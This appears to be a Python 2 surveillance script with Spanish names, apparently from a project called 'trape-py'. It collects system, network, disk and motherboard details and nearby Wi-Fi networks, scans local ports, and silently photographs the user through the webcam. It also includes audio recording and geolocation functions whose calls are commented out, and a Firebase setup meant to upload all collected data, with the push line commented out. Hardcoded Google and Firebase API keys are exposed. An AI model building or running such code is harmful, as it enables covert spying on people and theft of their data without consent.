
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import platform, re, urllib2, socket, urllib, psutil, sys, traceback, requests
import cv2, wmi
import pyaudio,wave
import uuid
import os
import pyrebase
import base64

def getmiIpPublica():
    pagina = urllib.urlopen('https://www.cual-es-mi-ip.net/').read()
    ip = re.search('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', pagina)
    return ip.group()

def getMiIpLocal(Namehost):
    direccion_equipo = socket.gethostbyname(Namehost)
    return direccion_equipo

def to_gb(bytes):
    "Convierte bytes a gigabytes."
    return bytes / 1024**3

def getEspacioEnDisco():
    disk_usage = psutil.disk_usage("C:\\")
    ep = ("Espacio total: {:.2f} GB.".format(to_gb(disk_usage.total)))
    el = ("Espacio libre: {:.2f} GB.".format(to_gb(disk_usage.free)))
    eu = ("Espacio usado: {:.2f} GB.".format(to_gb(disk_usage.used)))
    peu = ("Porcentaje de espacio usado: {}%.".format(disk_usage.percent))
    Datos = (ep,el,eu,peu)
    return Datos

def getPuertosOpen():
    IP = '127.0.0.1'
    Start = int(7999)
    End = int(8010)
    print '[+] Connecting to %s from %s to %s' % (IP, Start, End)
    connection = socket.socket()
    lista = []
    for i in range(Start, End+1):
        try:
            connection.connect( (IP, i) )
            a= ("Puerto: %s open" % i)
            #print (a)
        except:
            a= ("Puerto: %s close" % i)
            #print (a)
        lista.append(a)
    connection.close()
    return lista

# def getUbicacion():
#     datos={
#         "considerIp":"true"
#     }
#     url = "https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyA2bAdTNf2ro3yHQyUWDZBKI_1DHDjk9jg"
#     response = requests.post(url,json=datos)
#     data = response.json()
#     print(str(data))

def getSerialDisk():
    c = wmi.WMI()
    for item in c.Win32_PhysicalMedia():
        print item.SerialNumber
        print item.Tag
        break;

def getSerialUUID():
    #print uuid.UUID(int=uuid.getnode())
    print uuid.uuid1()

def getSerialPlaca():
    print os.system('wmic baseboard get product,Manufacturer,version,serialnumber')

def getInterfacesRed():
    print os.system('netsh wlan show networks mode=bssid')


def getFoto():
    cap = cv2.VideoCapture(0)

    leido, frame = cap.read()

    if leido == True:
        cv2.imwrite("foto.png", frame)
        print("Foto tomada correctamente")
        image = open('foto.png', 'rb') #open binary file in read mode
        image_read = image.read()
        image_64_encode = base64.encodestring(image_read)
    else:
        print("Error al acceder a la camara")

    return image_64_encode
    cap.release()

def getAudio():
    # se definen parametros
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    CHUNK = 1024
    duracion = 10
    archivo = "grabacion.wav"

    #se inicia pyaudio
    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT,channels=CHANNELS, rate=RATE,
        input=True,
        frames_per_buffer=CHUNK)

    #se inicia la grabacion
    print("grabando...")
    frames=[]
    for i in range(0, int(RATE/CHUNK*duracion)):
        data=stream.read(CHUNK)
        frames.append(data)
    print("grabacion terminada")

    # se detiene la grabacion
    stream.stop_stream()
    stream.close()
    audio.terminate()

    waveFile = wave.open(archivo, 'wb')
    waveFile.setnchannels(CHANNELS)
    waveFile.setsampwidth(audio.get_sample_size(FORMAT))
    waveFile.setframerate(RATE)
    waveFile.writeframes(b''.join(frames))
    waveFile.close()

platform_data = platform.uname()
print ('')
print ('')
ifs = ('-------Datos Del Sistema------')
so = ('Sistema Operativo : ' + str(platform_data[0]))
nu = ('Nombre De Usuario       : ' + str(platform.node()))
vs = ('Version   : ' + str(platform.version()))
aq = ('Arquitectura      : '+ str(platform.machine()))
pc = ('Procesador: '+ str(platform.processor()))
DSistema = (str(ifs), so,nu,vs,aq,pc)
print (str(DSistema))
print ('')
print ('')
ifr = ('-------Datos de Red------')
nr = ('Nombre de Usuario En Red : ' + str(platform.node()))
ipl = ('Ip Local: ' + str(getMiIpLocal(platform.node())))
ipp = ('Ip Publica: ' + str(getmiIpPublica()))
DRed = (ifr,nr,ipl,ipp)
print (str(DRed))
print ('')
print ('')
ifd = ('-------Espacios en disco------')
ed = str(getEspacioEnDisco())
DDisk = (str(ifd),str(ed))
print (str(DDisk))
print ('')
print ('')
ifp = ('-------Puertos Open------')
print (ifp)
print ('Scaneando Puertos....')
pu= getPuertosOpen()
DPuertos = (ifp,pu)
print (DPuertos)
print ('')
print ('')
print ('-------Ubicacion------')
# getUbicacion()
msjU = "Datos Ubicacion",
DUbicacion = (msjU)
print (DUbicacion)
print ('')
print ('')
print ('-------Foto------')
f = getFoto()
msjF = "Datos Foto",
DFoto = (msjF, f)
print (DFoto)
print ('')
print ('')
print ('-------Audio------')
# getAudio()
msjA = "Datos Audio",
DAudio = (msjA)
print (DAudio)
print ('')
print ('')
print ('-------N serial Disco------')
getSerialDisk()
print ('')
print ('')
print ('-------N serial UUID------')
getSerialUUID()
print ('')
print ('')
print ('-------Imformacion de la placa base------')
getSerialPlaca()
print ('')
print ('')
print ('-------Imformacion de las Interfaces de Red------')
getInterfacesRed()
DUniversal = (DSistema + DRed + DDisk + DPuertos + DUbicacion + DFoto + DAudio)
config = {
    "apiKey": "AIzaSyDNyT41R1AXYpp6k7xP3m4S_EIUGibcj8s",
    "authDomain": "trape-py-1554172486593.firebaseapp.com",
    "databaseURL": "https://trape-py-1554172486593.firebaseio.com",
    "projectId": "trape-py-1554172486593",
    "storageBucket": "trape-py-1554172486593.appspot.com",
    "messagingSenderId": "415942529071"
}

firebase = pyrebase.initialize_app(config)

db = firebase.database()

#enviar datos a firebase
# db.child("TRAPE").push({"informacion":DUniversal})
